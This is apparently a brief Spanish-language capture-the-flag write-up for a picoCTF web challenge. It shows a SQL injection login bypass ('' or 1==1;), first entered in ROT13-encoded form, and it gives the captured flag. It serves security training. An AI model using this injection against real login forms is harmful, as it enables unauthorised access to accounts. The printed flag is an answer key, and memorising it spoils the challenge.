## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!
## Solución
```

Entramos a la página que nos manda el reto y en el apartado del menu seleccionamos "Admin Login".
En el password ponemos lo siguiente:
password: ' be 1==1;

y lo que nos salga lo rotamos en la paguina cyberchef copiamos lo que sale en mi caso
SQL query: SELECT * FROM admin where password = '' or 1==1;'

lo copiamos y lo pegamos en password para que nos de la bandera.
# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}
```
## Bandera
```
picoCTF{3v3n_m0r3_SQL_7f5767f6}
```
## Referencias
https://gchq.github.io/CyberChef/